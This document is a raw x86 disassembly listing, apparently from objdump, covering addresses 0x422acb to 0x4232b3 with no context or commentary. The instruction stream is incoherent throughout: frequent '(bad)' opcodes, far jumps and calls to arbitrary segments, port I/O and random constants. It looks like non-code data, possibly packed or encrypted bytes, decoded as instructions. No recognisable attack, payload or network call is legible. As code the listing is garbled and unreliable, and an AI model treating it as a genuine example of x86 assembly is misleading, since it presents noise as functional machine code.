  422acb:	dec    ebx
  422acc:	jmp    0x422a93
  422ace:	add    eax,0x6e46d325
  422ad3:	leave  
  422ad4:	dec    eax
  422ad5:	je     0x422b25
  422ad7:	pop    esp
  422ad8:	ds popf 
  422ada:	xor    DWORD PTR [edx+0x3d185bce],0x8ab6c43a
  422ae4:	ss ror ebx,0x65
  422ae8:	(bad)  
  422ae9:	rcl    BYTE PTR [esi-0x2c41fe69],cl
  422aef:	aad    0x4a
  422af1:	fucom  st(7)
  422af3:	cwde   
  422af4:	and    eax,0x3f4ff87
  422af9:	sub    BYTE PTR [edx],dl
  422afb:	cmp    esp,ecx
  422afd:	dec    edx
  422afe:	jmp    0x422abd
  422b00:	rol    DWORD PTR [esi],0x70
  422b03:	sbb    BYTE PTR [eax],cl
  422b05:	xor    al,0xde
  422b07:	add    eax,0xb68293fe
  422b0c:	push   ss
  422b0d:	xchg   edx,edx
  422b0f:	dec    ebx
  422b10:	ret    0x3a67
  422b13:	es xchg esp,eax
  422b15:	aad    0x7f
  422b17:	jmp    0x4229:0xbdc0589d
  422b1e:	int3   
  422b1f:	xor    bh,BYTE PTR [eax]
  422b21:	cwde   
  422b22:	call   0xc65d:0x759379b4
  422b29:	add    DWORD PTR [eax+0x55],esi
  422b2c:	fild   DWORD PTR [edx]
  422b2e:	or     esi,DWORD PTR [ebp+edi*8-0x67ab2406]
  422b35:	test   al,0x6a
  422b37:	es mov al,0xb
  422b3b:	mov    esp,esi
  422b3d:	mov    ?,WORD PTR [esi+ebp*1+0x46]
  422b41:	xor    BYTE PTR [eax+0x7757eb5],al
  422b47:	xchg   DWORD PTR [esi+edi*8],esi
  422b4a:	shl    DWORD PTR [ebx+0x27],1
  422b4d:	das    
  422b4e:	jge    0x422b09
  422b50:	xor    ebp,DWORD PTR [eax-0x7765e036]
  422b56:	jbe    0x422b93
  422b58:	arpl   WORD PTR ds:0xd3a52c5b,si
  422b5e:	xchg   esp,eax
  422b5f:	ins    DWORD PTR es:[edi],dx
  422b60:	(bad)  
  422b61:	lds    ebx,FWORD PTR [ecx-0x5fa9007a]
  422b67:	jno    0x422b0d
  422b69:	xchg   ecx,eax
  422b6a:	call   0x53b534fb
  422b6f:	mov    edi,0xd95070f1
  422b74:	cld    
  422b75:	dec    edx
  422b76:	std    
  422b77:	fisubr DWORD PTR [edi]
  422b79:	jne    0x422b1c
  422b7b:	sbb    al,0x3c
  422b7d:	mov    eax,DWORD PTR [ecx]
  422b7f:	or     eax,0x629ea7f0
  422b84:	and    dl,ah
  422b86:	cmp    eax,0x588080cd
  422b8b:	push   0x2
  422b8d:	mov    ds:0x80893615,eax
  422b92:	out    dx,eax
  422b93:	sbb    bl,BYTE PTR [edx-0x7fb81865]
  422b99:	and    al,0x75
  422b9b:	test   eax,0x7eb886eb
  422ba0:	fwait
  422ba1:	sbb    BYTE PTR [esi-0x7686ef86],0xd6
  422ba8:	rcr    DWORD PTR [esi-0x4a],0xd7
  422bac:	mov    DWORD PTR [edx+0x435063c4],edx
  422bb2:	(bad)  
  422bb3:	(bad)  
  422bb5:	mov    bl,0xc9
  422bb7:	pop    esi
  422bb8:	push   edi
  422bb9:	nop
  422bba:	jmp    0x62ef3158
  422bbf:	mov    eax,DWORD PTR [esi]
  422bc1:	mov    ds:0x2313e9dc,eax
  422bc6:	fldlg2 
  422bc8:	sub    ah,BYTE PTR [edx+0x2d4a8ce1]
  422bce:	mov    ecx,0xaf325d6
  422bd3:	cmp    BYTE PTR [edx],bl
  422bd5:	(bad)  
  422bd6:	rol    DWORD PTR [edi],1
  422bd8:	loop   0x422bc6
  422bda:	outs   dx,BYTE PTR ds:[esi]
  422bdb:	xchg   ebx,eax
  422bdc:	iret   
  422bdd:	add    ebp,ebp
  422bdf:	(bad)  
  422be0:	xchg   ebx,eax
  422be1:	rol    DWORD PTR [ecx],1
  422be3:	jle    0x422c45
  422be5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422be6:	(bad)  
  422be9:	xor    DWORD PTR [esi+0x2a],0x2c
  422bed:	push   ebp
  422bee:	cmp    edi,DWORD PTR [ecx-0x36045c7c]
  422bf4:	fcom   QWORD PTR [edi+0x1]
  422bf7:	and    al,0xe2
  422bf9:	push   edx
  422bfa:	push   es
  422bfb:	dec    esp
  422bfc:	call   0x5ca638db
  422c01:	or     bh,BYTE PTR [edx+eiz*8]
  422c04:	fcmove st,st(2)
  422c06:	inc    edi
  422c07:	sub    eax,0xe7b8059
  422c0c:	sbb    DWORD PTR [eax+0x11],edi
  422c0f:	or     al,0xf
  422c11:	sbb    eax,0xf31e4eab
  422c16:	cdq    
  422c17:	aad    0x7
  422c19:	jmp    0x1b0f:0x7c6adf1e
  422c20:	push   ebx
  422c21:	inc    ebp
  422c22:	mov    dl,0x18
  422c24:	retf   0x5ef2
  422c27:	xchg   ebp,eax
  422c28:	push   esi
  422c29:	mov    DWORD PTR [ecx+edi*8-0x4e],esp
  422c2d:	jg     0x422c07
  422c2f:	clc    
  422c30:	push   ebx
  422c31:	popf   
  422c32:	mov    edx,DWORD PTR [ecx-0x39]
  422c35:	sbb    edx,eax
  422c37:	daa    
  422c38:	je     0x422c77
  422c3a:	ror    DWORD PTR [ecx],cl
  422c3c:	out    dx,al
  422c3d:	push   ebp
  422c3e:	xor    DWORD PTR ds:0xba9b0a1d,eax
  422c44:	sub    BYTE PTR [ebx+0x1c],al
  422c47:	push   es
  422c48:	daa    
  422c49:	out    dx,al
  422c4a:	addr16 pop es
  422c4c:	push   edi
  422c4d:	outs   dx,DWORD PTR ds:[esi]
  422c4e:	sub    DWORD PTR [edx+0x37],ebp
  422c51:	xor    dh,0xe9
  422c54:	lea    esp,[eax+0x49]
  422c57:	mov    ds,WORD PTR [eax-0x65447296]
  422c5d:	or     al,0x85
  422c5f:	xchg   ebp,eax
  422c60:	sub    edi,edi
  422c62:	xchg   BYTE PTR [esi+0x23],ah
  422c65:	shl    BYTE PTR [ecx-0x98b7d5a],cl
  422c6b:	pusha  
  422c6c:	and    eax,0x65a67c7b
  422c71:	pop    ebp
  422c72:	and    edi,esi
  422c74:	in     al,0xf3
  422c76:	aam    0x6f
  422c78:	xchg   ebx,eax
  422c79:	data16 add BYTE PTR [eax],al
	...
  422c84:	add    BYTE PTR [eax],al
  422c86:	add    BYTE PTR [ebp+0x5c],bh
  422c89:	inc    esp
  422c8a:	sub    ah,BYTE PTR [ebp+0x3a]
  422c8d:	jg     0x422cee
  422c8f:	scas   eax,DWORD PTR es:[edi]
  422c90:	retf   0x7432
  422c93:	push   ecx
  422c94:	aas    
  422c95:	xchg   esp,eax
  422c96:	int3   
  422c97:	adc    ecx,esi
  422c99:	add    DWORD PTR [eax],eax
  422c9b:	sub    eax,DWORD PTR [edx]
  422c9d:	add    BYTE PTR [eax],al
  422c9f:	std    
  422ca0:	fucom  st(4)
  422ca2:	(bad)  
  422ca3:	adc    cl,BYTE PTR [ebx+0x20e47932]
  422ca9:	(bad)  
  422caa:	fimul  WORD PTR ds:0x824248b5
  422cb0:	cmc    
  422cb1:	call   0xa77f:0xfc7ea15f
  422cb8:	aas    
  422cb9:	pop    esp
  422cba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cbb:	pop    DWORD PTR [esi-0x51]
  422cbe:	jmp    0xf93308a1
  422cc3:	fisttp DWORD PTR [eax+edi*4]
  422cc6:	lea    ebx,[ebp+eax*2+0x7ce53130]
  422ccd:	test   BYTE PTR [ebp-0x42],cl
  422cd0:	mov    ah,0x8f
  422cd2:	jae    0x422d07
  422cd4:	sub    esi,edi
  422cd6:	xor    ch,BYTE PTR [eax-0x79]
  422cd9:	push   eax
  422cda:	push   ecx
  422cdb:	jg     0x422cff
  422cdd:	mov    ebx,0xb4b7b6b0
  422ce2:	mov    bh,0xb8
  422ce4:	dec    ecx
  422ce5:	or     DWORD PTR [ebp+ecx*8+0x3],eax
  422ce9:	dec    esp
  422cea:	ret    
  422ceb:	adc    ah,BYTE PTR [edi+0x426dc35e]
  422cf1:	cdq    
  422cf2:	sbb    eax,0x508601f2
  422cf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cf8:	fsub   QWORD PTR [edi-0x7d50faad]
  422cfe:	retf   
  422cff:	imul   edi,DWORD PTR [ebx+0x40],0xba3a1fc0
  422d06:	mul    BYTE PTR ds:0xaff5d049
  422d0c:	inc    esp
  422d0d:	std    
  422d0e:	add    BYTE PTR [eax-0x39],cl
  422d11:	inc    di
  422d13:	or     eax,0xe42a376f
  422d18:	add    ebp,0xfd71999d
  422d1e:	mov    cl,ah
  422d20:	mov    edi,0x24d8fde6
  422d25:	mov    edi,0xd16bcc63
  422d2a:	sub    eax,0xc3ee7ba7
  422d2f:	mov    bl,0xce
  422d31:	jp     0x422dac
  422d33:	mov    ebx,ebx
  422d35:	neg    DWORD PTR [ebx]
  422d37:	jo     0x422cd6
  422d39:	or     DWORD PTR [esi+0xcba4013],esp
  422d3f:	mov    ds:0xafa62bf5,eax
  422d44:	fmul   st,st(2)
  422d46:	mov    cl,0x31
  422d48:	mov    bl,0x18
  422d4a:	xlat   BYTE PTR ds:[ebx]
  422d4b:	adc    al,0xad
  422d4d:	pop    es
  422d4e:	push   0x7f851e91
  422d53:	call   0xa4d8b74c
  422d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d59:	jo     0x422dc5
  422d5b:	popf   
  422d5c:	cmp    al,0x48
  422d5e:	jbe    0x422dbb
  422d60:	dec    eax
  422d61:	rol    DWORD PTR [ebp+ecx*2+0x7a],0x98
  422d66:	jno    0x422cfb
  422d68:	push   es
  422d69:	add    edi,DWORD PTR [ebp-0x6e]
  422d6c:	aaa    
  422d6d:	mov    edi,0xde42ee11
  422d72:	fnsave [eax-0x6297f02d]
  422d78:	leave  
  422d79:	xchg   ebx,eax
  422d7a:	adc    al,0x54
  422d7c:	dec    ebp
  422d7d:	js     0x422d8a
  422d7f:	inc    edi
  422d80:	test   DWORD PTR [ebp-0x63290acd],ebx
  422d86:	inc    esp
  422d87:	sbb    al,0xc6
  422d89:	push   ss
  422d8a:	les    ebx,FWORD PTR [edx]
  422d8c:	sti    
  422d8d:	mov    edx,DWORD PTR [edx]
  422d8f:	sbb    ebx,DWORD PTR [esi+0x4721fa7]
  422d95:	lea    ebp,ds:[ebx+0x7]
  422d99:	jg     0x422ded
  422d9b:	data16 test BYTE PTR [ebp+0x6b],dl
  422d9f:	ret    
  422da0:	ja     0x422d84
  422da2:	inc    edx
  422da3:	dec    ebx
  422da4:	lea    ebp,[ecx-0x196c5f0d]
  422daa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422dab:	ja     0x422d79
  422dad:	jge    0x422d35
  422daf:	scas   eax,DWORD PTR es:[edi]
  422db0:	clc    
  422db1:	rcl    BYTE PTR [edi-0x3d22ee3f],1
  422db7:	punpckhdq mm0,mm5
  422dba:	xchg   BYTE PTR [edi],cl
  422dbc:	cmp    eax,0x1a590e6
  422dc1:	adc    edx,DWORD PTR [edx+0x18f1ebcc]
  422dc7:	jmp    0x11d7ba02
  422dcc:	sub    ecx,DWORD PTR [ebp-0x4]
  422dcf:	sbb    DWORD PTR [edx+edx*4+0x52149219],ebx
  422dd6:	jge    0x422d7c
  422dd8:	ret    
  422dd9:	hlt    
  422dda:	imul   eax,DWORD PTR [esi-0x50],0xfed968f9
  422de1:	int    0x97
  422de3:	in     eax,0x72
  422de5:	lods   al,BYTE PTR ds:[esi]
  422de6:	mov    BYTE PTR [ebx+0x5f],0xab
  422dea:	or     al,0xcc
  422dec:	ficomp DWORD PTR [eax]
  422dee:	mul    BYTE PTR [esp+eiz*2]
  422df1:	cmp    al,BYTE PTR [eax+0x28]
  422df4:	pop    esp
  422df5:	jecxz  0x422e42
  422df7:	nop
  422df8:	pop    es
  422df9:	push   esp
  422dfa:	stos   DWORD PTR es:[edi],eax
  422dfb:	in     eax,dx
  422dfc:	jp     0x422e26
  422dfe:	pop    esp
  422dff:	push   cs
  422e00:	lods   eax,DWORD PTR ds:[esi]
  422e01:	cmp    bl,BYTE PTR [ebx-0x36b668b5]
  422e07:	fs xchg DWORD PTR es:[ecx-0xb779b46],eax
  422e0f:	push   esi
  422e10:	lahf   
  422e11:	mov    cl,0xd4
  422e13:	aam    0xe1
  422e15:	jb     0x422e14
  422e17:	inc    BYTE PTR [esi-0x4c]
  422e1a:	(bad)  
  422e1c:	xchg   DWORD PTR [esi-0x5320501e],esp
  422e22:	(bad)  [ebx]
  422e24:	add    dl,BYTE PTR [eax]
  422e26:	rol    BYTE PTR [esi],0x57
  422e29:	sbb    dh,ah
  422e2b:	ror    DWORD PTR [edx-0x73],1
  422e2e:	inc    edi
  422e2f:	mov    cs,WORD PTR [ecx]
  422e31:	jecxz  0x422db6
  422e33:	stos   BYTE PTR es:[edi],al
  422e34:	xlat   BYTE PTR ds:[ebx]
  422e35:	cmp    edx,edi
  422e37:	dec    esp
  422e38:	popa   
  422e39:	jmp    0x422dd8
  422e3b:	push   0xdc79c490
  422e40:	ret    0x6479
  422e43:	push   cs
  422e44:	fst    DWORD PTR [esi+0xe]
  422e47:	xor    al,0x63
  422e49:	mov    esi,0x62d64c2a
  422e4e:	push   ss
  422e4f:	dec    esi
  422e50:	int    0x7d
  422e52:	sbb    eax,0xfa5722b9
  422e57:	not    DWORD PTR [ebx+esi*2]
  422e5a:	xor    BYTE PTR [ebx],bh
  422e5c:	dec    eax
  422e5d:	dec    edi
  422e5e:	cmc    
  422e5f:	fnsave [ebx+0xc]
  422e62:	xor    al,0x68
  422e64:	scas   al,BYTE PTR es:[edi]
  422e65:	sub    ebp,ecx
  422e67:	clc    
  422e68:	test   DWORD PTR [ebx-0x2c],0x4217aa19
  422e6f:	cmp    eax,0x4a4cef76
  422e74:	jmp    0x87c31931
  422e79:	mov    cl,0x54
  422e7b:	adc    dh,BYTE PTR [edx]
  422e7d:	mov    edx,ebx
  422e7f:	ss mov eax,edx
  422e82:	cmp    BYTE PTR [eax],al
  422e84:	in     al,0x8f
  422e86:	mov    dh,0x7e
  422e88:	push   ebx
  422e89:	out    dx,al
  422e8a:	jb     0x422efa
  422e8c:	or     DWORD PTR [ecx+0x52],esp
  422e8f:	or     al,0x81
  422e91:	jne    0x422e69
  422e93:	xchg   ecx,eax
  422e94:	addr16 ja 0x422e87
  422e97:	stc    
  422e98:	mov    al,0x3
  422e9a:	add    dl,bl
  422e9c:	or     BYTE PTR [ebp+0x45203dc],0xb6
  422ea3:	sub    al,0x2c
  422ea5:	add    eax,0x449c3192
  422eaa:	xchg   ebx,eax
  422eab:	jg     0x422e6b
  422ead:	xchg   ecx,esp
  422eaf:	jle    0x422e9e
  422eb1:	pop    eax
  422eb2:	in     eax,dx
  422eb3:	cwde   
  422eb4:	mov    al,0xf
  422eb6:	jbe    0x422e44
  422eb8:	fcomp  DWORD PTR [edx+0x115b3f3c]
  422ebe:	dec    edx
  422ebf:	cmp    al,0xf9
  422ec1:	in     eax,0x2c
  422ec3:	adc    esi,DWORD PTR ds:0x46b0e251
  422ec9:	mov    edx,0x0
	...
  422ed6:	add    BYTE PTR ds:0xf61e66b1,ah
  422edc:	fistp  QWORD PTR [ebp-0x45]
  422edf:	mov    ah,0x39
  422ee1:	sbb    eax,0xd14c2753
  422ee6:	in     al,dx
  422ee7:	rol    BYTE PTR ds:[ecx],1
  422eea:	add    BYTE PTR [ebx],ch
  422eec:	add    al,BYTE PTR [eax]
  422eee:	add    BYTE PTR [ebx],bl
  422ef0:	push   ebx
  422ef1:	jbe    0x422f4c
  422ef3:	outs   dx,DWORD PTR ds:[esi]
  422ef4:	jb     0x422ed8
  422ef6:	test   al,0x9b
  422ef8:	dec    esi
  422ef9:	add    eax,edi
  422efb:	add    al,0xb5
  422efd:	or     al,0x74
  422eff:	pop    es
  422f00:	mov    BYTE PTR [edx+ebp*1+0x60da95f5],al
  422f07:	test   al,0x2
  422f09:	ja     0x422eda
  422f0b:	loopne 0x422ea4
  422f0d:	jmp    0x422ea9
  422f0f:	cmp    al,0xed
  422f11:	fs pop ebp
  422f13:	call   DWORD PTR [edi-0x32]
  422f16:	lods   eax,DWORD PTR ds:[esi]
  422f17:	mov    al,0xfc
  422f19:	mov    cl,BYTE PTR [ecx]
  422f1b:	add    bh,al
  422f1d:	pop    ecx
  422f1e:	mov    ds:0x57a3c4b7,al
  422f23:	sbb    al,0xff
  422f25:	shl    BYTE PTR [ecx-0x50639756],0x64
  422f2c:	or     ebp,DWORD PTR [esp+eax*8]
  422f2f:	inc    ecx
  422f30:	es fs (bad) 
  422f34:	inc    ebp
  422f35:	dec    ecx
  422f36:	jmp    0x2726:0xf3979ac7
  422f3d:	or     al,0x9e
  422f3f:	jnp    0x422ef9
  422f41:	inc    ebx
  422f42:	call   0x725c:0x4d575d15
  422f49:	(bad)  [eax-0xde523b5]
  422f4f:	imul   edi,DWORD PTR [eax],0xfd115231
  422f55:	and    cl,BYTE PTR [edx+0x6c]
  422f58:	loop   0x422f81
  422f5a:	cmp    DWORD PTR [ecx+0x41],0x19
  422f5e:	and    al,0x22
  422f60:	lock jbe 0x422fb1
  422f63:	xchg   ecx,eax
  422f64:	mov    gs,WORD PTR [esi+ebx*1]
  422f67:	imul   edi,DWORD PTR [edx+0x62],0xc8275eb5
  422f6e:	or     BYTE PTR [esi],dh
  422f70:	aaa    
  422f71:	lods   al,BYTE PTR ds:[esi]
  422f72:	outs   dx,BYTE PTR ds:[esi]
  422f73:	add    ah,BYTE PTR [ecx-0x7]
  422f76:	out    dx,al
  422f77:	xchg   eax,ebx
  422f79:	in     eax,dx
  422f7a:	les    esp,FWORD PTR [ebp-0x46]
  422f7d:	jae    0x422f7d
  422f7f:	test   al,0x18
  422f81:	jbe    0x422ffe
  422f83:	popf   
  422f84:	outs   dx,DWORD PTR ds:[esi]
  422f85:	adc    eax,0x930f8b50
  422f8a:	sti    
  422f8b:	add    DWORD PTR [edi+esi*8+0x74],0x7e9f88d1
  422f93:	add    BYTE PTR [eax],ah
  422f95:	sub    ecx,0x5e6804f1
  422f9b:	inc    edi
  422f9c:	xchg   BYTE PTR [esi],cl
  422f9e:	pop    ebx
  422f9f:	aaa    
  422fa0:	sub    edx,DWORD PTR [ecx+0x5f]
  422fa3:	adc    DWORD PTR [ebx],eax
  422fa5:	pop    fs
  422fa7:	js     0x422ff0
  422fa9:	es and esi,0x711cf5e9
  422fb0:	xor    DWORD PTR [ecx+0x23ef970],edx
  422fb6:	sbb    al,0x97
  422fb8:	(bad)  
  422fba:	(bad)  
  422fbb:	xchg   edx,eax
  422fbc:	and    ah,ch
  422fbe:	out    0x31,eax
  422fc0:	dec    ebp
  422fc1:	pop    ss
  422fc2:	push   ebx
  422fc3:	jb     0x422fcc
  422fc5:	pop    ss
  422fc6:	jle    0x423047
  422fc8:	mov    eax,0xd5cd016f
  422fcd:	outs   dx,BYTE PTR ds:[esi]
  422fce:	push   eax
  422fcf:	mov    eax,esi
  422fd1:	shl    BYTE PTR [ebx+0x5913808],0xeb
  422fd8:	sbb    BYTE PTR [ecx-0x1f0096cb],0xa6
  422fdf:	je     0x422fce
  422fe1:	mov    ah,0x81
  422fe3:	cli    
  422fe4:	sar    cl,cl
  422fe6:	mov    cl,0x7d
  422fe8:	jnp    0x422fd8
  422fea:	cmc    
  422feb:	push   0x75
  422fed:	or     ah,BYTE PTR fs:0x1f346557
  422ff4:	mov    BYTE PTR [ebp+0x3b059b36],al
  422ffa:	cwde   
  422ffb:	add    al,0xa6
  422ffd:	and    eax,0x3cc47862
  423002:	lds    ebp,FWORD PTR [ebp-0x26abf259]
  423008:	inc    eax
  423009:	lds    ebx,FWORD PTR [eax]
  42300b:	sbb    ah,dh
  42300d:	inc    esi
  42300e:	inc    esi
  42300f:	sub    eax,DWORD PTR [esi-0xe]
  423012:	out    dx,al
  423013:	lods   eax,DWORD PTR ds:[esi]
  423014:	in     al,dx
  423015:	cmp    BYTE PTR [ebx],cl
  423017:	xchg   ecx,eax
  423018:	adc    BYTE PTR [edi+0x76695ca8],al
  42301e:	imul   ebx,DWORD PTR [edi+0xb57f824],0xffffff95
  423025:	and    dl,BYTE PTR [eax-0x3d14faa6]
  42302b:	xor    DWORD PTR [ebx],edx
  42302d:	pop    ecx
  42302e:	pop    ds
  42302f:	jp     0x423030
  423031:	fsub   st(4),st
  423033:	idiv   BYTE PTR [esi+0x391e5e07]
  423039:	das    
  42303a:	test   al,0x11
  42303c:	dec    ecx
  42303d:	lods   eax,DWORD PTR ds:[esi]
  42303e:	(bad)  
  42303f:	and    dl,ch
  423041:	jmp    0x4230a6
  423043:	adc    al,0x71
  423045:	mov    esi,DWORD PTR [ebx-0x3]
  423048:	inc    esi
  423049:	bnd jne 0x423092
  42304c:	jae    0x423016
  42304e:	addr16 in eax,0xae
  423051:	aas    
  423052:	push   eax
  423054:	js     0x42302c
  423056:	test   DWORD PTR [esi+0x2008b2b],0xceb248bd
  423060:	jb     0x423080
  423062:	xor    al,0xbc
  423064:	outs   dx,BYTE PTR ds:[esi]
  423065:	test   eax,0x7750b148
  42306a:	push   es
  42306b:	(bad)  
  42306d:	popf   
  42306e:	jne    0x423068
  423070:	(bad)
  423073:	jl     0x4230ed
  423075:	cmp    eax,0xfcf51dc8
  42307a:	fwait
  42307b:	xchg   esp,eax
  42307c:	or     al,0x68
  42307e:	dec    eax
  42307f:	adc    BYTE PTR [esi-0x53],ah
  423082:	jle    0x423102
  423084:	pavgb  mm7,QWORD PTR [esi+eiz*4-0x1f7ef29c]
  42308c:	repz xchg ebx,eax
  42308e:	rcr    edx,0x6a
  423091:	mov    ds:0x7e5fe5d7,eax
  423096:	scas   al,BYTE PTR es:[edi]
  423097:	pop    ds
  423098:	rcr    BYTE PTR [esi-0x7a],cl
  42309b:	test   DWORD PTR [esi-0x203ee3fb],ecx
  4230a1:	dec    edx
  4230a2:	xor    BYTE PTR [esi],ch
  4230a4:	or     al,0x45
  4230a6:	pop    edx
  4230a7:	fisttp DWORD PTR [ebp-0x4654c885]
  4230ad:	test   eax,0xae91879a
  4230b2:	fs es inc ecx
  4230b5:	dec    esp
  4230b6:	sub    DWORD PTR [esi-0x500a9573],ecx
  4230bc:	iret   
  4230bd:	test   al,0x7b
  4230bf:	mov    bh,BYTE PTR [esi+0x9]
  4230c2:	xor    BYTE PTR [edi],0x1f
  4230c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230c6:	retf   0x4dd4
  4230c9:	mov    al,ds:0xe57842f
  4230ce:	inc    esi
  4230cf:	jp     0x4230df
  4230d1:	pop    ds
  4230d2:	sub    eax,0x1e3a8808
  4230d7:	jmp    0x8963:0xc5248bf1
  4230de:	(bad)  
  4230df:	dec    ecx
  4230e0:	push   esp
  4230e1:	idiv   BYTE PTR ds:0x5ec0d0aa
  4230e7:	lea    edx,[ebx-0x48]
  4230ea:	xchg   edx,eax
  4230eb:	or     esi,DWORD PTR [eax-0x4e]
  4230ee:	loopne 0x4230ce
  4230f0:	and    ebp,esi
  4230f2:	sbb    eax,eax
  4230f4:	lods   eax,DWORD PTR ds:[esi]
  4230f5:	dec    edx
  4230f6:	in     eax,dx
  4230f7:	fcmovne st,st(5)
  4230f9:	push   esi
  4230fa:	popa   
  4230fb:	cmp    DWORD PTR [edi],ecx
  4230fd:	ret    
  4230fe:	jge    0x4230c0
  423100:	jmp    0x170452f0
  423105:	loopne 0x4230f6
  423107:	ins    DWORD PTR es:[edi],dx
  423108:	jbe    0x423113
  42310a:	sbb    eax,0x3c1b9e3c
  42310f:	es cli 
  423111:	sbb    BYTE PTR [esi],ah
  423113:	inc    edx
  423114:	xor    BYTE PTR [eax],bl
  423116:	dec    edi
  423117:	sbb    dl,0x2f
	...
  423126:	add    BYTE PTR [eax+0x5dfe1dc1],al
  42312c:	(bad)  
  42312d:	jecxz  0x42312e
  42312f:	or     al,0x2a
  423131:	popf   
  423132:	div    BYTE PTR [ebx]
  423134:	pusha  
  423135:	cdq    
  423136:	adc    al,0x69
  423138:	rol    BYTE PTR [ecx],cl
  42313a:	add    BYTE PTR [ebx],ch
  42313c:	add    al,BYTE PTR [eax]
  42313e:	add    BYTE PTR [eax-0x15d68ebe],ah
  423144:	(bad)  
  423145:	repz jno 0x423166
  423148:	sbb    edx,DWORD PTR [ebx]
  42314a:	scas   al,BYTE PTR es:[edi]
  42314b:	fst    DWORD PTR [ebx]
  42314d:	adc    DWORD PTR [ecx+0x53],0x89bdb840
  423154:	add    DWORD PTR [ebx],edi
  423156:	ja     0x4230e2
  423158:	(bad)  
  423159:	push   esp
  42315a:	or     BYTE PTR [ebp+0x332e623c],dh
  423160:	pop    esi
  423161:	jae    0x42314c
  423163:	rol    BYTE PTR [esi+0x37],0xfe
  423167:	push   edi
  423168:	lods   eax,DWORD PTR ds:[esi]
  423169:	or     eax,0x3de4a189
  42316e:	stos   BYTE PTR es:[edi],al
  42316f:	retf   0x8d5c
  423172:	mov    eax,0x7ea056f7
  423177:	sub    al,0x2c
  423179:	jae    0x4231c2
  42317b:	push   0xffffffc5
  42317d:	sbb    DWORD PTR [eax],0xcc54483f
  423183:	cmp    ah,BYTE PTR [ebp-0x1950c1b0]
  423189:	cmp    DWORD PTR [edi],eax
  42318b:	push   ss
  42318c:	or     BYTE PTR [ebx+0x41],al
  42318f:	std    
  423190:	and    ecx,esi
  423192:	sbb    DWORD PTR [eax+0x13d53e65],ebp
  423198:	les    edi,FWORD PTR [ecx]
  42319a:	push   ebp
  42319b:	js     0x4231bf
  42319d:	dec    esi
  42319e:	dec    eax
  42319f:	aas    
  4231a0:	inc    edi
  4231a1:	or     DWORD PTR [edi-0x44b00b1c],edx
  4231a7:	in     al,dx
  4231a8:	loop   0x4231c3
  4231aa:	sbb    DWORD PTR [eax],0xffffff8c
  4231ad:	sahf   
  4231ae:	stos   DWORD PTR es:[edi],eax
  4231af:	jnp    0x423222
  4231b1:	cmp    DWORD PTR [ecx-0xf0ca54],ebx
  4231b7:	sub    esp,DWORD PTR [esi+0x525c2473]
  4231bd:	sub    BYTE PTR [ecx+0x64719d2e],al
  4231c3:	push   ss
  4231c4:	inc    edx
  4231c5:	sub    cl,BYTE PTR [eax+0x671c1303]
  4231cb:	xor    eax,0x3db5fdc1
  4231d0:	xchg   esp,eax
  4231d1:	cmp    eax,DWORD PTR [ecx+0x6f40db1b]
  4231d7:	jmp    0x68c9:0x2d42ce2c
  4231de:	adc    ecx,DWORD PTR [edi+0x65]
  4231e1:	mov    al,0x93
  4231e3:	cmp    DWORD PTR [edx+ebp*4+0x462a9e03],eax
  4231ea:	outs   dx,DWORD PTR ds:[esi]
  4231eb:	jecxz  0x42318f
  4231ed:	bnd call 0x265dad70
  4231f3:	add    eax,0xb27d323a
  4231f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4231f9:	addr16 cmp eax,0xe3ff0a1e
  4231ff:	sbb    DWORD PTR [esi],0x74
  423202:	das    
  423203:	dec    esi
  423204:	std    
  423205:	rcl    DWORD PTR [ecx+0x7112976c],1
  42320b:	cmp    al,0xbc
  42320d:	mov    ds:0x31e2a253,eax
  423212:	dec    esp
  423213:	scas   eax,DWORD PTR es:[edi]
  423214:	test   eax,0xf0fbfb70
  423219:	mov    esi,0x71b8ce07
  42321e:	outs   dx,DWORD PTR ds:[esi]
  42321f:	sub    DWORD PTR [ecx],edx
  423221:	sub    DWORD PTR [esi],ebx
  423223:	test   BYTE PTR [esi+ebx*1+0x6a],ah
  423227:	jno    0x4231c0
  423229:	out    dx,al
  42322a:	dec    edi
  42322b:	sti    
  42322c:	pop    DWORD PTR [ecx]
  42322e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42322f:	fild   QWORD PTR [eax-0x79]
  423232:	es inc ecx
  423234:	js     0x4231ce
  423236:	sub    esp,DWORD PTR [edi-0x1ebb0d04]
  42323c:	aas    
  42323d:	push   ss
  42323e:	rol    edi,0x22
  423241:	dec    edx
  423242:	and    esi,0xac2b8182
  423248:	xor    BYTE PTR [eax],bl
  42324a:	test   eax,0xda52f060
  42324f:	cmp    dl,BYTE PTR [edi+0x76]
  423252:	ret    0xf81e
  423255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423256:	cmp    DWORD PTR [eax],esp
  423258:	or     al,0xb3
  42325a:	mov    es,WORD PTR [edi+0x65]
  42325d:	fnstsw WORD PTR [ecx-0x3ed6891e]
  423263:	push   ecx
  423264:	mov    ds:0xc86edaee,eax
  423269:	in     al,0x1c
  42326b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42326c:	mov    bl,0x2c
  42326e:	scas   eax,DWORD PTR es:[edi]
  42326f:	dec    DWORD PTR [ebx+0x19fdb950]
  423275:	xchg   BYTE PTR [edi-0x54],bl
  423278:	clc    
  423279:	pop    esp
  42327a:	add    BYTE PTR [eax+0x33],cl
  42327d:	mov    esp,0xba89bf09
  423282:	xchg   esp,eax
  423283:	push   eax
  423284:	mov    esi,0x2fbe6a50
  423289:	leave  
  42328a:	mov    edi,0x9ee580bb
  42328f:	pop    ebx
  423290:	xchg   edi,eax
  423291:	mov    WORD PTR [edi-0x5f1fbd9f],?
  423297:	mov    bh,0x84
  423299:	je     0x423306
  42329b:	aam    0xc5
  42329d:	in     al,0xf4
  42329f:	and    al,BYTE PTR [esi-0x5a]
  4232a2:	lahf   
  4232a3:	into   
  4232a4:	fs mov edx,0x70fbb5ca
  4232aa:	jne    0x4232ec
  4232ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232ad:	bound  ebp,QWORD PTR [esi+0x718a40a5]
  4232b3:	mov    eax,ds:0x68e7a2e1
